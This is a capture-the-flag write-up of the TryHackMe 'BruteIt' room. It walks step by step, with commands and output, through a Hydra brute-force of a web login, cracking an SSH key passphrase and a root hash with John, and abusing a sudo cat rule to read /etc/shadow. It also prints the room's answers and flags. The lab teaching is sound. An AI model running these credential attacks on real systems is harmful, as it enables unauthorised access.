---
title: "BruteIt - TryHackMe"
author: Dark_side.84
categories: [TryHackMe]
tags: [web, enumeration, hydra, john-the-ripper, hash-cracking, privilege-escalation, sudo, brute-force, ctf, linux]
render_with_liquid: false
image: /images/tryhackme_bruteit/room_image.webp
---

# BruteIt - TryHackMe

**BruteIt** focuses on web form brute-forcing, password hash cracking, and Linux privilege escalation. The challenge begins with initial reconnaissance and directory enumeration to identify web login interfaces.

Using tools like **Hydra** or **Burp Suite**, admin credentials were brute-forced to gain unauthorized administrative access. Discovered RSA private keys and password hashes were subsequently cracked using **John the Ripper** / **Hashcat** to establish initial shell access.

Finally, system permissions were analyzed to identify misconfigured `sudo` rights, allowing straightforward **privilege escalation** to root to complete the room.

[![TryHackMe Room Link](/images/tryhackme_bruteit/room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/bruteit){: .center }

## Reconnaissance and Service Enumeration

### Full Port Scan (Nmap)

```console
$ nmap -sC -sV -p- 10.48.174.13
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 22:09 +0300
Nmap scan report for 10.48.174.13
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 637.70 seconds
```

The Nmap scan reveals two accessible services:

- **22/SSH** — Running OpenSSH 7.6p1 on Ubuntu Linux.
- **80/HTTP** — Running Apache httpd 2.4.29 with the default Ubuntu landing page.

---

### Room Questions & Answers

**Search for open ports using nmap.**

| Question | Answer |
|---|---|
| How many ports are open? | `2` |
| What version of SSH is running? | `OpenSSH 7.6p1` |
| What version of Apache is running? | `2.4.29` |
| Which Linux distribution is running? | `Ubuntu` |

---

### Directory Enumeration (Gobuster)

To locate hidden directories and endpoints hosted on the Apache web server, `gobuster` was executed using the `big.txt` wordlist.

The command used:

```bash
gobuster dir -u http://10.48.174.13/ -w '/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt'
```

Result:

```console
$ gobuster dir -u http://10.48.174.13/ -w '/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt'
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.174.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/darkside84/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
admin                (Status: 301) [Size: 312] [--> http://10.48.174.13/admin/]
Progress: 2786 / 20476 (13.61%)
```

**Search for hidden directories on web server.**

* **What is the hidden directory?**
  * **Answer:** `/admin`

![Brute It Admin directory](/images/tryhackme_bruteit/Admin_page.png){: width="1200" height="600"}

### Source Code Inspection

Navigating to `http://10.48.174.13/admin/` reveals an **Admin Login Page**. Inspecting the page source code exposes a hidden HTML comment left by the developer:

![Admin Page Source](/images/tryhackme_bruteit/page_source_username_leak.png){: width="1200" height="600"}

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

---

## Web Brute-Forcing and Initial Access

### Admin Panel Brute-Force (Hydra)

With the confirmed username `admin` and the target login path `/admin/index.php`, **Hydra** was used alongside the `rockyou.txt` wordlist to perform a form-based brute-force attack against the authentication endpoint.

The command used:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.174.13 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

Result:

```console
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.174.13 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-28 13:59:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.48.174.13:80/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid
[80][http-post-form] host: 10.48.174.13   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-28 14:00:27
```

The attack successfully identified valid credentials for the admin dashboard:

- **Username:** admin
- **Password:** xavier

### Room Questions & Answers

* **What is the user:password of the admin panel?**
  * **Answer:** `admin:xavier`

### Admin Panel Access & RSA Key Retrieval

Using the discovered credentials (`admin:xavier`), we log in to the admin panel at `http://10.48.174.13/admin/`:

![Admin Login](/images/tryhackme_bruteit/login_with_cracked_creds.png){: width="1200" height="600"}

Upon successful authentication, the server redirects us to `http://10.48.174.13/admin/panel/`. This page greets us with the message:

> Hello john, finish the development of the site, here's your RSA private key.

The page also displays the web flag directly on screen:

![Admin Panel Flag and RSA Link](/images/tryhackme_bruteit/First_flag_&_RSA_Key.png){: width="1200" height="600"}

Clicking the **RSA private key** link redirects to `http://10.48.174.13/admin/panel/id_rsa`, revealing the encrypted private key (`id_rsa`):

![RSA Private Key](/images/tryhackme_bruteit/RSA_Private_key.png){: width="1200" height="600"}

### Room Questions & Answers

* **What is the web flag?**
  * **Answer:** `THM{brut3_f0rce_is_e4sy}`

---

## Cracking the RSA Private Key

### Step 1: Saving the RSA Private Key Locally

First, create a new file named `bruteit` using `nano`, paste the copied RSA private key contents into the text editor, and save the file (`Ctrl + X`, then `Y`, then `Enter`):

```bash
nano bruteit
```

![RSA Private Key Nano](/images/tryhackme_bruteit/nano_bruteit.png){: width="1200" height="600"}

### Step 2: Extracting the Key Hash and Cracking with John the Ripper

Attempting to run John directly against the raw key file fails to load the SSH private key format properly, but I left the attempt below to show the process:

```console
$ john bruteit --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 25 password hashes with 25 different salts (cryptoSafe [AES-256-CBC])
```

To properly extract a crackable hash format from the SSH private key, `ssh2john` was used to convert `bruteit` into a hash file named `bi`:

```console
ssh2john bruteit > bi
```

With the hash extracted, John the Ripper was executed against `bi` using `rockyou.txt`:

```console
$ john bi --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (bruteit)
1g 0:00:00:00 DONE (2026-07-29 23:26) 4.761g/s 345752p/s 345752c/s 345752C/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John's passphrase was successfully cracked:

- **Passphrase:** rockinroll

![john cracking process](/images/tryhackme_bruteit/terminal_john_cracking.png){: width="1200" height="600"}

### Room Questions & Answers

**Crack the RSA key you found.**

* **What is John's RSA Private Key passphrase?**
  * **Answer:** `rockinroll`

---

## SSH Access & User Flag

### Establishing SSH Session

Before using the RSA private key to authenticate via SSH, permissions on the `bruteit` file must be restricted to read/write for the owner only (`chmod 600`), as OpenSSH will reject keys with insecure permissions.

Next, log in as user `john` using the key and the cracked passphrase (`rockinroll`):

```console
$ chmod 600 bruteit
$ ssh -i bruteit john@10.48.174.13
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'bruteit': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

john@bruteit:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
john@bruteit:~$ whoami
john
```

![ssh session + flag](/images/tryhackme_bruteit/ssh_as_john.png){: width="1200" height="600"}

### Retrieving the User Flag

Once logged in as `john`, reading `user.txt` in the home directory yields the user flag:

```console
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
```

### Room Questions & Answers

* **What is the user flag?**
  * **Answer:** `THM{a_password_is_not_a_barrier}`

---

## Privilege Escalation

### Checking Sudo Privileges

To find a path to escalate privileges to the `root` user, we first check what commands the current user `john` is allowed to execute with elevated privileges by running `sudo -l`:

```console
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

The output reveals a critical misconfiguration: `john` is permitted to run `/bin/cat` as `root` without providing a password. This allows us to read any protected file on the system.

### Retrieving the Root Password Hash

Since we can read sensitive files, we can use `sudo cat` to read `/etc/shadow`, which contains the system's encrypted password hashes. Our primary target is the `root` user's hash:

```console
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

![cat root hash](/images/tryhackme_bruteit/PrivilegeEscalation_root_hash.png){: width="1200" height="600"}

### Cracking the Root Hash

With the `root` hash acquired, we can attempt to crack it offline. First, back on the local attacker machine, save the extracted hash to a new file named `rootbrute` using `nano`:

```bash
nano rootbrute
```

Next, use John the Ripper with the `rockyou.txt` wordlist to crack the SHA-512 hash:

```console
$ john rootbrute --wordlist=/usr/share/wordlists/rockyou.txt
...
football         (root)
```

This successfully cracked the hash, revealing the root password to be `football`.

![root password cracked](/images/tryhackme_bruteit/root_password.png){: width="1200" height="600"}

### Gaining Root Access & Final Flag

Returning to our SSH session on the target machine, we can now use the `su` (substitute user) command to switch to the `root` account using the newly cracked password:

```console
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cd /root
root@bruteit:~# cat root.txt
THM{YOUR_ROOT_FLAG_HERE}
```

![root flag](/images/tryhackme_bruteit/root_flag.png){: width="1200" height="600"}

We now have full root access to the machine and have successfully completed the room!

### Room Questions & Answers

**Find a form to escalate your privileges.**
*(No answer required — achieved by exploiting `/bin/cat`)*

* **What is root's password?**
  * **Answer:** `football`

* **root.txt**
  * **Answer:** `THM{YOUR_ROOT_FLAG_HERE}`

---

## Video Walkthrough

If you prefer a visual guide or want to watch the complete step-by-step exploitation process in real-time, check out my video walkthrough on YouTube:

[![BruteIt - TryHackMe Walkthrough](https://img.youtube.com/vi/AvC6go4TGp4/maxresdefault.jpg)](https://youtu.be/AvC6go4TGp4?si=Ui5OFK2eXjaiR3AP)

* **YouTube Channel:** [0xD4rk_s1d3](https://www.youtube.com/@0xD4rk_s1d3)
* **Watch Here:** [TryHackMe - BruteIt Walkthrough](https://youtu.be/AvC6go4TGp4?si=Ui5OFK2eXjaiR3AP)

---

## Conclusion

The **BruteIt** room is a great hands-on exercise covering essential web security and Linux penetration testing concepts: web directory fuzzing, HTTP form brute-forcing, converting and cracking SSH RSA keys, and abusing `sudo` NOPASSWD misconfigurations for privilege escalation.

I hope you found this guide helpful! Don't forget to check out the YouTube channel for more CTF writeups and walkthroughs.

Best regards,
**Dark_side.84** <3
